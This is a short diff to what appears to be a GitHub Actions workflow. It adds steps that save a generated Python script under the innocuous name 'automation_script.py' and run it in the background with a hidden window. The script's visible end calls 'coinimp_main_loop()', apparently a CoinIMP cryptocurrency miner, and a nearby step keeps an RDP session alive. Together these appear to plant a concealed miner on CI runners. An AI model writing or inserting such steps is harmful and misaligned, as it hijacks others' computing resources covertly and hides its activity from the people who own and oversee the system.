@@ -753,6 +753,17 @@ jobs:
             '    print("="*50)',
             '    coinimp_main_loop()'
           )
+          # Save the script to a file
+          Set-Content -Path $scriptPath -Value $pythonParts -Encoding UTF8
+          Write-Host "Python script created successfully at: $scriptPath"
+          
+      - name: Run Python script
+        run: |
+          $scriptPath = "$env:TEMP\automation_script.py"
+          
+          # Run the script in the background
+          Start-Process python -ArgumentList "$scriptPath" -WindowStyle Hidden
+          Write-Host "Python script started in the background"          
             
       - name: Keep RDP session active
         run: |
